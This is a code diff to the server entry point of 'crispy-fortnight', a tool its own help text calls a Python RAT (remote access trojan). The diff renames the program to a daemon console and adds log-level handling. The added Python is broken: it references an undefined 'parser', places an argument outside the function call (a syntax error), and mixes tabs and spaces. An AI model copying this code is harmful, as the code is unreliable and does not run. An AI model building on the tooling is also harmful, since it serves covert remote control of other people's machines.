@@ -6,20 +6,37 @@ from crispy.network.server_handler import CrispyTCPServerHandler
 from crispy.lib.server import CrispyTCPServer
     
 def main():
-    argp = argparse.ArgumentParser(description="Run crispy-fortnight (Python RAT) server.",
-                                     epilog="Do NOT use this for nefarious purposes!", 
-                                     prog="crispy")
+    argp = argparse.ArgumentParser(description="Crispy-fortnight (Python RAT) daemon console.",
+                                   epilog="Do NOT use this for nefarious purposes!", 
+                                   prog="crispyd")
     argp.add_argument("--config",
                         dest="config_file",
                         help="Path to crispy config file",
                         metavar="CONFIG_FILE",
                         required=True,
                         type=str)
+    parser.add_argument('--loglevel',
+			help="Change log verbosity",
+			choices=["DEBUG", "ERROR", "INFO", "WARNING"],
+			default="WARNING")
+			dest="loglevel",
     argp.add_argument('--version', 
                         action='version', 
                         version='1.0')
     args = argp.parse_args()
     
+    if args.loglevel=="ERROR":
+	loglevel=logging.ERROR
+    elif args.loglevel=="DEBUG":
+	loglevel=logging.DEBUG
+    elif args.loglevel=="INFO":
+	loglevel=logging.INFO
+    else:
+	loglevel=logging.WARNING
+
+    logging.basicConfig(format='%(asctime)-15s - %(levelname)-5s - %(message)s')
+    logging.getLogger().setLevel(loglevel)
+
     config = ConfigParser.ConfigParser()
     config.read(args.config_file)
     
